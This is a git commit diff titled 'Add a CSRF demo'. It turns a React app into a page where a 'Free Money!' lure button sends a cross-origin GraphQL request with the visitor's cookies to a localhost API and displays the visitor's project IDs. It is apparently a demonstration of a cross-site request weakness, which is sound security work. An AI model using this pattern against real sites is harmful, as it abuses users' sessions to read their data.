fa20e226b868b0016c96f327b926e731f5d5cd0c
Stéphane Bégaudeau <stephane.begaudeau@gmail.com>
2020-07-10 09:46:17 +0200

    Add a CSRF demo

--- src/index.js
+++ src/index.js
@@ -1,8 +1,44 @@
-import React from 'react';
+import React, { useState } from 'react';
 import ReactDOM from 'react-dom';
-import './index.css';
-import App from './App';
-import * as serviceWorker from './serviceWorker';
+
+const getProjectsQuery = `
+query getProjects {
+  viewer {
+    projects {
+      id
+    }
+  }
+}
+`;
+
+const App = () => {
+  const [state, setState] = useState([]);
+
+  const onClick = async () => {
+    const response = await fetch('http://localhost:8080/api/graphql', {
+      method: 'POST',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      },
+      credentials: 'include',
+      mode: 'cors',
+      body: JSON.stringify({ query: getProjectsQuery })
+    });
+    const json = await response.json();
+    const projectIds = json.data.viewer.projects.map(project => project.id);
+    setState(projectIds);
+  };
+
+  return (
+    <div>
+      <button onClick={onClick}>Free Money!</button>
+      <ul>
+        {state.map(entry => <li key={entry}>{entry}</li>)}
+      </ul>
+    </div>
+  );
+};
 
 ReactDOM.render(
   <React.StrictMode>
@@ -10,8 +46,3 @@ ReactDOM.render(
   </React.StrictMode>,
   document.getElementById('root')
 );
-
-// If you want your app to work offline and load faster, you can change
-// unregister() to register() below. Note this comes with some pitfalls.
-// Learn more about service workers: https://bit.ly/CRA-PWA
-serviceWorker.unregister();
